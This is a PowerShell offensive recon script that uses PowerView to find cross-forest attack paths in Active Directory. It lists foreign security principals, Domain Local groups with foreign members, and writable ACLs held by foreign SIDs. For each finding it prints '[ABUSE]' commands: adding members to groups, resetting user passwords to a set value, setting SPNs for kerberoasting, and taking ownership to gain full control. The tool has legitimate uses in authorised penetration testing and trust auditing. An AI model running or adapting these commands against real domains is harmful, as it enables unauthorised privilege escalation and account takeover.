<#
.SYNOPSIS
  Enumerate and abuse Foreign Security Principals (FSPs) and Foreign ACLs across forests.

.DESCRIPTION
  Focused recon for cross-forest paths where identities from a foreign forest are added to Domain Local groups in the target forest and/or hold writable ACLs
  (GenericAll/WriteDacl/WriteOwner/GenericWrite/WriteProperty) over target objects.

.REQUIREMENTS
  PowerView

.EXAMPLES
  .\fsp-foreign.ps1 -Domain target.local
  .\fsp-foreign.ps1 -Domain target.local -ForeignFilter "trusted.local"
  .\fsp-foreign.ps1 -Domain target.local -OutGrid
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$Domain,
    [string]$ForeignFilter,
    [switch]$OutGrid
)

# --- Check for PowerView ---
$pvRequired = @(
    'Get-DomainObject','Get-DomainForeignGroupMember','Get-DomainGroup',
    'Get-DomainObjectAcl','Get-DomainSID','ConvertFrom-SID','Convert-NameToSid'
)
foreach ($cmd in $pvRequired) {
    if (-not (Get-Command $cmd -ErrorAction SilentlyContinue)) {
        throw "[!] Missing PowerView function '$cmd'. Import PowerView.ps1 first (`. .\PowerView.ps1`)."
    }
}

function Write-Section($title) {
    Write-Host ""
    Write-Host ("=== {0} ===" -f $title) -ForegroundColor Cyan
}

function Get-DomainDN([string]$DnsDomain) {
    # Option A: wrap the pipeline, then join
    return ( ($DnsDomain -split '\.') | ForEach-Object { "DC=$_" } ) -join ','
}

function Try-ResolveSid([string]$Sid, [string]$Domain) {
    try { return ConvertFrom-SID -ObjectSID $Sid -Domain $Domain -ErrorAction Stop } catch {}
    try { return (New-Object System.Security.Principal.SecurityIdentifier($Sid)).Translate([System.Security.Principal.NTAccount]).Value } catch {}
    return $null
}

function Get-SidPrefix([string]$Sid) {
    if ($Sid -match '^(S-\d-\d+(-\d+){4})-\d+$') { return $Matches[1] }
    if ($Sid -match '^(S-\d-\d+(-\d+){4})$')     { return $Matches[1] }
    if ($Sid -match '^(S-\d-\d+(?:-\d+)+)-\d+$') { return $Matches[1] }
    return $Sid
}

# Resolve the *target* domain SID, used to decide "foreign" vs "local"
$TargetDomainSid = $null
try {
    $ds = Get-DomainSID -Domain $Domain -ErrorAction Stop
    if     ($ds -is [string]) { $TargetDomainSid = $ds }
    elseif ($ds -is [byte[]]) { $TargetDomainSid = (New-Object System.Security.Principal.SecurityIdentifier($ds,0)).Value }
    elseif ($ds.PSObject.Properties['Sid']) { $TargetDomainSid = $ds.Sid }
} catch {}
if (-not $TargetDomainSid) { throw "[!] Could not resolve Domain SID for $Domain" }
$TargetSidEsc   = [regex]::Escape($TargetDomainSid)
$TargetSidPrefix= Get-SidPrefix -Sid $TargetDomainSid
$DomainDN       = Get-DomainDN $Domain

# ------------------------------------------------------------------------------------
# 1) FSP INVENTORY
# ------------------------------------------------------------------------------------
Write-Section "Foreign Security Principals (FSP) in $Domain"
$fspRaw = @()
try {
    $fspRaw = Get-DomainObject -Domain $Domain -LDAPFilter '(objectClass=ForeignSecurityPrincipal)' -ErrorAction Stop
} catch {}

if (-not $fspRaw -or $fspRaw.Count -eq 0) {
    Write-Host "[i] No ForeignSecurityPrincipal objects found." -ForegroundColor DarkGray
    $FSP = @()
} else {
    $FSP = $fspRaw | ForEach-Object {
        $sid = $_.objectsid
        if (-not $sid) { $sid = $_.name }
        $sidStr   = "$sid"
        $resolved = Try-ResolveSid -Sid $sidStr -Domain $Domain
        [pscustomobject]@{
            Type         = 'FSP'
            Domain       = $Domain
            FspCN        = $_.cn
            SID          = $sidStr
            ResolvedName = $resolved
            DN           = $_.distinguishedname
        }
    }

    if ($ForeignFilter) {
        $FSP = $FSP | Where-Object {
            $_.SID -match $ForeignFilter -or ($_.ResolvedName -and $_.ResolvedName -match $ForeignFilter)
        }
    }

    if (-not $FSP -or $FSP.Count -eq 0) {
        Write-Host "[i] No FSPs matched filter '$ForeignFilter'." -ForegroundColor DarkGray
    } else {
        foreach ($row in $FSP) {
            $rn = if ($row.ResolvedName) { $row.ResolvedName } else { "<unresolved>" }
            Write-Host ("[FSP] {0}  ->  {1}" -f $row.SID, $rn) -ForegroundColor Magenta
        }
    }
}

# ------------------------------------------------------------------------------------
# 2) FOREIGN GROUP MEMBERSHIP (Domain Local groups containing foreign members)
# ------------------------------------------------------------------------------------
Write-Section "Foreign Group Membership (Domain Local groups in $Domain with foreign members)"
# Try PowerView's built-in first
$fgm = @()
try { $fgm = Get-DomainForeignGroupMember -Domain $Domain -ErrorAction Stop } catch {}

# Fallback: enumerate groups with members and detect DN domain mismatch
if (-not $fgm -or $fgm.Count -eq 0) {
    try {
        $groups = Get-DomainGroup -Domain $Domain -LDAPFilter '(member=*)'
        foreach ($g in $groups) {
            $gName  = $g.samaccountname
            $gScope = $g.groupScope
            foreach ($memDN in @($g.member)) {
                # Extract member domain from DN (DC=... pieces)
                $dcs = [regex]::Matches($memDN,'DC=([^,]+)') | ForEach-Object { $_.Groups[1].Value }
                if ($dcs.Count -eq 0) { continue }
                $memDom = ($dcs -join '.').ToLower()
                if ($memDom -ne $Domain.ToLower()) {
                    $fgm += [pscustomobject]@{
                        GroupDomain             = $Domain
                        GroupName               = $gName
                        GroupDistinguishedName  = $g.distinguishedname
                        MemberDomain            = $memDom
                        MemberName              = $memDN  # DN; resolve below if possible
                        MemberDistinguishedName = $memDN
                        GroupScope              = $gScope
                    }
                }
            }
        }
    } catch {}
}

if (-not $fgm -or $fgm.Count -eq 0) {
    Write-Host "[i] No foreign group membership found." -ForegroundColor DarkGray
    $FGM_Resolved = @()
} else {
    # Resolve SID-looking MemberName into friendly name; keep only Domain Local groups
    $FGM_Resolved = foreach ($x in $fgm) {
        $member   = $x.MemberName
        $friendly = $member
        if ($member -match '^S-\d-') { $friendly = Try-ResolveSid -Sid $member -Domain $Domain }
        if (-not $friendly) { $friendly = $member }

        $scopeOk = $true
        if ($x.PSObject.Properties['GroupScope']) {
            $gs = "$($x.GroupScope)".ToLower()
            if ($gs -match '^(domainlocal|4)$') { $scopeOk = $true } else { $scopeOk = $false }
        }

        if ($scopeOk) {
            [pscustomobject]@{
                Type         = 'ForeignGroupMember'
                GroupDomain  = $x.GroupDomain
                GroupName    = $x.GroupName
                GroupDN      = $x.GroupDistinguishedName
                MemberDomain = $x.MemberDomain
                MemberName   = $friendly
                RawMember    = $x.MemberName
                GroupScope   = $x.GroupScope
            }
        }
    }

    if ($ForeignFilter) {
        $FGM_Resolved = $FGM_Resolved | Where-Object {
            ($_.MemberName -and $_.MemberName -match $ForeignFilter) -or
            ($_.RawMember   -and $_.RawMember   -match $ForeignFilter)
        }
    }

    if (-not $FGM_Resolved -or $FGM_Resolved.Count -eq 0) {
        Write-Host "[i] No foreign group membership matched filter '$ForeignFilter'." -ForegroundColor DarkGray
    } else {
        foreach ($row in $FGM_Resolved) {
            Write-Host ("[GROUP] {0}\{1}  <=  member: {2}" -f $row.GroupDomain, $row.GroupName, $row.MemberName) -ForegroundColor Yellow
            Write-Host "  [ABUSE] If group grants access (e.g., shares/RBAC), pivot using the foreign principal's TGT to target resources." -ForegroundColor DarkYellow
        }
    }
}

# ------------------------------------------------------------------------------------
# 3) FOREIGN ACLs (Writable ACEs granted to foreign SIDs)
# ------------------------------------------------------------------------------------
Write-Section "Foreign ACLs (Writable ACEs granted to foreign SIDs) in $Domain"
$allACL = @()
try { $allACL = Get-DomainObjectAcl -Domain $Domain -ResolveGUIDs -Identity * -ErrorAction SilentlyContinue } catch {}
if (-not $allACL -or $allACL.Count -eq 0) {
    Write-Host "[i] No ACLs returned (permissions/visibility?)." -ForegroundColor DarkGray
    $FACL = @()
} else {
    $FACL = $allACL | Where-Object {
        ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and
        ($_.AceType -match 'AccessAllowed') -and
        ("$($_.SecurityIdentifier)" -match '^S-1-5-.*-[1-9]\d{3,}$') -and
        ("$($_.SecurityIdentifier)" -notmatch $TargetSidEsc)
    } | ForEach-Object {
        $sidStr      = "$($_.SecurityIdentifier)"
        $trusteeName = Try-ResolveSid -Sid $sidStr -Domain $Domain
        $objName     = $null
        try {
            $objName = (Try-ResolveSid -Sid "$($_.ObjectSID)" -Domain $Domain)
            if (-not $objName) { $objName = $_.ObjectDN }
        } catch { $objName = $_.ObjectDN }

        [pscustomobject]@{
            Type        = 'ForeignACL'
            Domain      = $Domain
            Rights      = $_.ActiveDirectoryRights
            TrusteeSID  = $sidStr
            TrusteeName = $trusteeName
            ObjectSID   = "$($_.ObjectSID)"
            ObjectName  = $objName
            ObjectClass = $_.ObjectClass
            ObjectDN    = $_.ObjectDN
            Inherited   = $_.IsInherited
        }
    }

    if ($ForeignFilter) {
        $FACL = $FACL | Where-Object {
            ($_.TrusteeSID -match $ForeignFilter) -or
            ($_.TrusteeName -and $_.TrusteeName -match $ForeignFilter)
        }
    }

    if (-not $FACL -or $FACL.Count -eq 0) {
        Write-Host "[i] No foreign writable ACEs matched filter '$ForeignFilter'." -ForegroundColor DarkGray
    } else {
        foreach ($r in $FACL) {
            $tn = if ($r.TrusteeName) { $r.TrusteeName } else { $r.TrusteeSID }
            Write-Host ("[ACL] {0}  ->  Trustee: {1} ({2})  Target: {3}" -f $r.Rights, $tn, $r.TrusteeSID, $r.ObjectName) -ForegroundColor Green
            # Abuse hints (quick)
            if ($r.Rights -match 'GenericAll') {
                if ($r.ObjectClass -match 'group') {
                    Write-Host "  [ABUSE] Add member to target group:" -ForegroundColor Yellow
                    Write-Host ("    Add-DomainGroupMember -Domain {0} -Identity '{1}' -Members '<you\or\controlled>'" -f $Domain, $r.ObjectName) -ForegroundColor DarkYellow
                } elseif ($r.ObjectClass -match 'user') {
                    Write-Host "  [ABUSE] Reset target user's password:" -ForegroundColor Yellow
                    Write-Host ("    $pw = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force" ) -ForegroundColor DarkYellow
                    Write-Host ("    Set-DomainUserPassword -Domain {0} -Identity '{1}' -AccountPassword $pw" -f $Domain, $r.ObjectName) -ForegroundColor DarkYellow
                } else {
                    Write-Host "  [ABUSE] Full control – consider WriteDacl/Owner pivot or SPN/RBCD depending on class." -ForegroundColor DarkYellow
                }
            } elseif ($r.Rights -match 'WriteDacl') {
                Write-Host "  [ABUSE] Grant yourself GenericAll on the object via WriteDacl, then proceed." -ForegroundColor DarkYellow
            } elseif ($r.Rights -match 'GenericWrite|WriteProperty') {
                if ($r.ObjectClass -match 'user') {
                    Write-Host "  [ABUSE] Set SPN (kerberoast) or password reset (if permitted) / targeted attribute write." -ForegroundColor DarkYellow
                } elseif ($r.ObjectClass -match 'group') {
                    Write-Host "  [ABUSE] Modify group membership (WriteProperty)." -ForegroundColor DarkYellow
                } else {
                    Write-Host "  [ABUSE] Writable attributes – enumerate which and leverage accordingly." -ForegroundColor DarkYellow
                }
            } elseif ($r.Rights -match 'WriteOwner') {
                Write-Host "  [ABUSE] Take ownership, then WriteDacl -> GenericAll." -ForegroundColor DarkYellow
            }
        }
    }
}


$Global:FSP_ForeignReport = @()
if ($FSP)          { $Global:FSP_ForeignReport += $FSP }
if ($FGM_Resolved) { $Global:FSP_ForeignReport += $FGM_Resolved }
if ($FACL)         { $Global:FSP_ForeignReport += $FACL }

Write-Section "Summary"
$cntFSP  = if ($FSP)          { $FSP.Count }          else { 0 }
$cntFGM  = if ($FGM_Resolved) { $FGM_Resolved.Count } else { 0 }
$cntFACL = if ($FACL)         { $FACL.Count }         else { 0 }
Write-Host ("FSP objects: {0}" -f $cntFSP)  -ForegroundColor Gray
Write-Host ("Foreign Group Members: {0}" -f $cntFGM) -ForegroundColor Gray
Write-Host ("Foreign Writable ACLs: {0}" -f $cntFACL) -ForegroundColor Gray
Write-Host ("[i] All rows are in `$Global:FSP_ForeignReport. Example: `$Global:FSP_ForeignReport | Export-Csv fsp_report.csv -NoTypeInformation") -ForegroundColor DarkGray

if ($OutGrid) {
    try { $Global:FSP_ForeignReport | Out-GridView -Title "FSP & Foreign ACLs - $Domain" } catch {}
}
